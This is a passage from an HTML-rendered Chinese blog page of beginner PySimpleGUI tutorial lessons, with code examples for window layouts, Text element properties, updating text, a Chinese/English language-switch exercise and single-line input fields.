class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">用+号拼接的方式：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">layout=[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;请输入基本信息&#x27;)],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;姓名&#x27;)]+[sg.In()]]+[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;性别&#x27;)]+[sg.In()]]+[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;国籍&#x27;),sg.In()],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">]   #在同一个布局里也可以用加号拼接。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">课内所用代码如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import PySimpleGUI as sg</span></span><br><span class="line"><span class="string">layout=[</span></span><br><span class="line"><span class="string">[sg.Text(&#x27;请输入基本信息&#x27;)],</span></span><br><span class="line"><span class="string">[sg.Text(&#x27;姓名&#x27;)]+[sg.In()]]+[</span></span><br><span class="line"><span class="string">[sg.Text(&#x27;性别&#x27;)]+[sg.In()]]+[</span></span><br><span class="line"><span class="string">[sg.Text(&#x27;国籍&#x27;),sg.In()],</span></span><br><span class="line"><span class="string">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">window=sg.Window(&#x27;Python教程&#x27;,layout)</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">   event,values=window.read()</span></span><br><span class="line"><span class="string">   if event==None:</span></span><br><span class="line"><span class="string">       break</span></span><br><span class="line"><span class="string">window.close() 作者：程序员无声 https://www.bilibili.com/read/cv15585454 出处：bilibili</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">layout=[</span><br><span class="line">[sg.Text(<span class="string">&#x27;请输入基本信息&#x27;</span>)],</span><br><span class="line">[sg.Text(<span class="string">&#x27;姓名&#x27;</span>)]+[sg.In()]]+[</span><br><span class="line">[sg.Text(<span class="string">&#x27;性别&#x27;</span>)]+[sg.In()]]+[</span><br><span class="line">[sg.Text(<span class="string">&#x27;国籍&#x27;</span>),sg.In()],</span><br><span class="line">[sg.B(<span class="string">&#x27;确认&#x27;</span>),sg.B(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python教程&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	event,values=window.read()</span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="7文本元素的设定方法-py"><a href="#7文本元素的设定方法-py" class="headerlink" title="7文本元素的设定方法.py"></a>7文本元素的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">文本元素的书写方法及属性的设定方法</span></span><br><span class="line"><span class="string">一般是指单行文本，也可以指多行文本,多行文本时也不会出现滚动条。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sg.Text(&#x27;&#x27;),支持简写sg.T(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 设定方法：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sg.Text(    text=&quot;&quot;)</span></span><br><span class="line"><span class="string">可设定的属性如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">text=&quot;&quot;, # str:要显示的文本。可以包含/n以实现多行。    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=None, # [str, int, tuple, object]:                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # 元素唯一标识符，                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # 书写规范 key=&#x27;-NMAE-&#x27;。用于元素的定位。    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">size=(None, None),# (int, int): 元素宽度,行高    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">font=None,# 设定字体的名称,大小                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # font=&#x27;宋体&#x27;               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">auto_size_text=None,# bool: 元素根据文本自动调节大小    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enable_events=False,# bool: 事件属性,设定为True时，点击文本发生事件。    relief=None, # 浮雕设计 &#x27;raised&#x27;,&#x27;sunken&#x27;,&#x27;flat&#x27;,&#x27;ridge&#x27;,&#x27;solid&#x27;,&#x27;groove&#x27;  border_width=None,# 设定relief时，用来设定边界宽度    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">text_color=None, # 文本颜色    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">background_color=None,# 文本背景颜色    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">justification=None,# 对齐方式: &#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pad=None,# 元素间隔设定  记住左右上下                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         # (int, int) or ((int, int),(int,int))                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         #  or (int,(int,int))or ((int, int),int)                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         # (left/right, top/bottom) or ((left, right), (top, bottom))    right_click_menu=None, # 右击调出菜单  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">List[List[Union[List[str],str]]]# 设定后,右击此元素可以调出菜单。  grab=False,  # bool:如果为真,点此元素可以移动拖拽窗口    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tooltip=None, # str:悬浮文本 ,当光标置于该元素上方,会显示设定的文本。    visible=True  # bool: 元素可见状态 作者：程序员无声 https://www.bilibili.com/read/cv15585577?spm_id_from=333.999.0.0 出处：bilibili</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">text=<span class="string">&#x27;&#x27;&#x27;江南春</span></span><br><span class="line"><span class="string">唐	杜牧</span></span><br><span class="line"><span class="string">千里莺啼绿映红，</span></span><br><span class="line"><span class="string">水村山郭酒旗风。</span></span><br><span class="line"><span class="string">南朝四百八十寺，</span></span><br><span class="line"><span class="string">多少楼台烟雨中。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">	[sg.T(<span class="string">&#x27;你好&#x27;</span>),sg.T(<span class="string">&#x27;你好&#x27;</span>),sg.T(<span class="string">&#x27;你好&#x27;</span>)],</span><br><span class="line">	[sg.T(<span class="string">&#x27;你好&#x27;</span>),sg.T(<span class="string">&#x27;你好&#x27;</span>,pad=((<span class="number">30</span>),(<span class="number">30</span>))),sg.T(<span class="string">&#x27;你好&#x27;</span>)],</span><br><span class="line">	[sg.T(<span class="string">&#x27;你好&#x27;</span>),sg.T(<span class="string">&#x27;你好&#x27;</span>),sg.T(<span class="string">&#x27;你好&#x27;</span>)],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [sg.T(text, 	# sg.Text() 缩写 sg.T()</span></span><br><span class="line"><span class="comment"># 	key=&#x27;-Text-&#x27;, 		# 元素唯一标识符，书写规范key=&#x27;-NMAE-&#x27;, 用于元素的定位</span></span><br><span class="line"><span class="comment"># 	size=(None,None),	 	# 元素宽度，行高（int, int）</span></span><br><span class="line"><span class="comment"># 	font=(&#x27;宋体&#x27;,20),	# 设定字体的名称，大小，font=&#x27;宋体&#x27;，font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]</span></span><br><span class="line"><span class="comment"># 	auto_size_text=True,  # 当设定值为True时，窗口自动适应文本大小</span></span><br><span class="line"><span class="comment"># 	enable_events=False,		# bool：事件属性，设定为True时，点击文本发生事件。</span></span><br><span class="line"><span class="comment"># 	relief=&#x27;groove&#x27;,				# 浮雕设计&#x27;raised&#x27;,&#x27;sunken&#x27;,&#x27;flat&#x27;,&#x27;ridge&#x27;,&#x27;solid&#x27;,&#x27;groove&#x27;</span></span><br><span class="line"><span class="comment"># 	border_width=10,		# 设定relif时，用来设定边界宽度</span></span><br><span class="line"><span class="comment"># 	text_color=&#x27;grey&#x27;,		# 文本颜色</span></span><br><span class="line"><span class="comment"># 	background_color=&#x27;white&#x27;,	# 文本背景颜色</span></span><br><span class="line"><span class="comment"># 	justification=None,		# 对齐方式：&#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;</span></span><br><span class="line"><span class="comment"># 	pad=None,				# 元素间隔设定，记住左右上下(int,int) or ((int,int),(int,int)) </span></span><br><span class="line"><span class="comment"># 							# or (int, (int,int)) or ((int,int),int) or (left/right,top/bottom) or ((left,right),(top,bottom))</span></span><br><span class="line"><span class="comment"># 	right_click_menu=[&#x27;1&#x27;,[&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;]],	# 右击调出菜单List[List[Union[List[str],str]]，设定后，右击此元素可以调出菜单</span></span><br><span class="line"><span class="comment"># 	grab=True,				# 如果为真，点此元素可以移动拖拽窗口</span></span><br><span class="line"><span class="comment"># 	tooltip=&#x27;这是一个提示文本&#x27;,			# str:悬浮文本，光标置于该元素上方，会显示设定的文本</span></span><br><span class="line"><span class="comment"># 	visible=True 			# bool：元素可见状态</span></span><br><span class="line"><span class="comment"># 	)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line">]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python教程&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	event,value=window.read()</span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> event== <span class="string">&#x27;-Text-&#x27;</span>:</span><br><span class="line">		sg.Popup(<span class="string">&#x27;运行一个点击事件&#x27;</span>)</span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="8设定文本元素的更新的方法-py"><a href="#8设定文本元素的更新的方法-py" class="headerlink" title="8设定文本元素的更新的方法.py"></a>8设定文本元素的更新的方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在事件发生后，需要更新文本元素的设定方法</span></span><br><span class="line"><span class="string">元素的更新方法</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string">文本元素可以更新的属性</span></span><br><span class="line"><span class="string">update(</span></span><br><span class="line"><span class="string">	value=None, # str 更新文本</span></span><br><span class="line"><span class="string">	background_color=None, # 更新文本背景颜色</span></span><br><span class="line"><span class="string">	text_color=None, # 更新文本颜色</span></span><br><span class="line"><span class="string">	font=None, # 更新字体的名称或者大小</span></span><br><span class="line"><span class="string">	visible=None # 更新元素的可见状态</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">举例说明</span></span><br><span class="line"><span class="string">更新文本显示</span></span><br><span class="line"><span class="string">window[key].update(value=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">window[key].update(&#x27;&#x27;)</span></span><br><span class="line"><span class="string">更新文本背景颜色</span></span><br><span class="line"><span class="string">window[key].update(background_color=&#x27;red&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">layout=[</span><br><span class="line">[sg.T(<span class="string">&#x27;程序员无声&#x27;</span>,key=<span class="string">&#x27;-Text-&#x27;</span>),sg.B(<span class="string">&#x27;点赞&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python图形界面开发教程&#x27;</span>,layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	event,values=window.read()</span><br><span class="line">	<span class="built_in">print</span>(event)</span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> event == <span class="string">&#x27;点赞&#x27;</span>:</span><br><span class="line">		window[<span class="string">&#x27;-Text-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;谢谢支持！&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			background_color=<span class="string">&#x27;white&#x27;</span>, <span class="comment"># 更新文本背景颜色</span></span><br><span class="line">			text_color=<span class="string">&#x27;black&#x27;</span>, <span class="comment"># 更新文本颜色</span></span><br><span class="line">			font=(<span class="string">&#x27;黑体&#x27;</span>,<span class="number">30</span>), <span class="comment"># 更新字体的名称或者大小</span></span><br><span class="line">			visible=<span class="literal">None</span> <span class="comment"># 更新元素的可见状态</span></span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="9练习-制作一个可中英文切换的页面-py"><a href="#9练习-制作一个可中英文切换的页面-py" class="headerlink" title="9练习-制作一个可中英文切换的页面.py"></a>9练习-制作一个可中英文切换的页面.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 导入库</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 定义布局，确定行数</span></span><br><span class="line">layout=[</span><br><span class="line">			[sg.B(<span class="string">&#x27;中文&#x27;</span>),sg.B(<span class="string">&#x27;English&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;请输入您的基本信息&#x27;</span>,key=<span class="string">&#x27;-top-&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;姓名&#x27;</span>,key=<span class="string">&#x27;-name-&#x27;</span>,size=(<span class="number">8</span>,<span class="number">1</span>)),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;性别&#x27;</span>,key=<span class="string">&#x27;-sex-&#x27;</span>,size=(<span class="number">8</span>,<span class="number">1</span>)),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;国籍&#x27;</span>,key=<span class="string">&#x27;-nation-&#x27;</span>,size=(<span class="number">8</span>,<span class="number">1</span>)),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Button(<span class="string">&#x27;确定&#x27;</span>,key=<span class="string">&#x27;-confirm-&#x27;</span>),sg.Button(<span class="string">&#x27;取消&#x27;</span>,key=<span class="string">&#x27;-cancel-&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建窗口</span></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 事件循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">	event,value=window.read() <span class="comment"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:  <span class="comment"># 窗口关闭事件</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> event == <span class="string">&#x27;中文&#x27;</span>:</span><br><span class="line">		window[<span class="string">&#x27;-top-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;请输入您的基本信息&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-name-&#x27;</span>].update(<span class="string">&#x27;姓名&#x27;</span>)</span><br><span class="line">		window[<span class="string">&#x27;-sex-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;性别&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-nation-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;国籍&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-confirm-&#x27;</span>].update(<span class="string">&#x27;确认&#x27;</span>)</span><br><span class="line">		window[<span class="string">&#x27;-cancel-&#x27;</span>].update(<span class="string">&#x27;取消&#x27;</span>)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> event == <span class="string">&#x27;English&#x27;</span>:</span><br><span class="line">		window[<span class="string">&#x27;-top-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;Please enter basic information&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-name-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;Name&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-sex-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;Sex&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-nation-&#x27;</span>].update(</span><br><span class="line">			value=<span class="string">&#x27;Nationality&#x27;</span>, <span class="comment"># str 更新文本</span></span><br><span class="line">			)</span><br><span class="line">		window[<span class="string">&#x27;-confirm-&#x27;</span>].update(<span class="string">&#x27;Confirm&#x27;</span>)</span><br><span class="line">		window[<span class="string">&#x27;-cancel-&#x27;</span>].update(<span class="string">&#x27;Cancel&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭窗口</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="10单行输入框元素的设定方法-py"><a href="#10单行输入框元素的设定方法-py" class="headerlink" title="10单行输入框元素的设定方法.py"></a>10单行输入框元素的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">单行输入框元素的设定方法</span></span><br><span class="line"><span class="string">sg.In(&#x27;你好&#x27;,size=(30,None),password_char=&#x27;*&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">layout=[</span><br><span class="line">[sg.T(<span class="string">&#x27;账号：&#x27;</span>),sg.In(</span><br><span class="line">    <span class="string">&#x27;请输入您的账号&#x27;</span>,  <span class="comment"># 默认值设定，可以为空字符串</span></span><br><span class="line">    key=<span class="string">&#x27;-Text-&#x27;</span>, 		<span class="comment"># 元素唯一标识符，书写规范key=&#x27;-NMAE-&#x27;, 用于元素的定位</span></span><br><span class="line">	size=(<span class="literal">None</span>,<span class="literal">None</span>),	 	<span class="comment"># 元素宽度，行高（int, int）</span></span><br><span class="line">    disabled=<span class="literal">None</span>,      <span class="comment"># bool：元素禁用，如果为True则禁用，无法输入任何值</span></span><br><span class="line">    password_char=<span class="string">&#x27;&#x27;</span>,   <span class="comment"># 密码字符，一般设置为*</span></span><br><span class="line">	font=(<span class="string">&#x27;宋体&#x27;</span>,<span class="number">20</span>),    	<span class="comment"># 设定字体的名称，大小，font=&#x27;宋体&#x27;，font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]</span></span><br><span class="line">	enable_events=<span class="literal">False</span>,		<span class="comment"># bool：事件属性，设定为True时，点击文本发生事件。</span></span><br><span class="line">	border_width=<span class="number">10</span>,		<span class="comment"># 设定relif时，用来设定边界宽度</span></span><br><span class="line">	text_color=<span class="string">&#x27;grey&#x27;</span>,		<span class="comment"># 文本颜色</span></span><br><span class="line">	background_color=<span class="string">&#x27;white&#x27;</span>,	<span class="comment"># 文本背景颜色</span></span><br><span class="line">	justification=<span class="literal">None</span>,		<span class="comment"># 对齐方式：&#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;</span></span><br><span class="line">	pad=<span class="literal">None</span>,				<span class="comment"># 元素间隔设定，记住左右上下(int,int) or ((int,int),(int,int))</span></span><br><span class="line">							<span class="comment"># or (int, (int,int)) or ((int,int),int) or (left/right,top/bottom) or ((left,right),(top,bottom))</span></span><br><span class="line">	right_click_menu=[<span class="string">&#x27;1&#x27;</span>,[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>]],	<span class="comment"># 右击调出菜单List[List[Union[List[str],str]]，设定后，右击此元素可以调出菜单</span></span><br><span class="line">	tooltip=<span class="string">&#x27;这是一个提示文本&#x27;</span>,			<span class="comment"># str:悬浮文本，光标置于该元素上方，会显示设定的文本</span></span><br><span class="line">	visible=<span class="literal">True</span>,</span><br><span class="line">    do_not_clear=<span class="literal">True</span>,       <span class="comment"># bool：输入框内容不被清除。如果为False，一发生事件，该输入框内的值会被清除。</span></span><br><span class="line">    focus=<span class="literal">False</span>,    <span class="comment"># bool：设定焦点，如果为True，则光标显示在此输入框。</span></span><br><span class="line">    disabled_readonly_background_color=<span class="literal">None</span>,  <span class="comment"># str：元素禁用时的背景颜色设定</span></span><br><span class="line">    disabled_readonly_text_color=<span class="literal">None</span>,  <span class="comment"># 元素禁用时的文本颜色设定</span></span><br><span class="line"></span><br><span class="line">)],</span><br><span class="line">[sg.T(<span class="string">&#x27;密码：&#x27;</span>),sg.In(<span class="string">&#x27;&#x27;</span>,focus=<span class="literal">True</span>)],</span><br><span class="line">[sg.B(<span class="string">&#x27;确定&#x27;</span>),sg.B(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	event,value=window.read() <span class="comment"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:  <span class="comment"># 窗口关闭事件</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

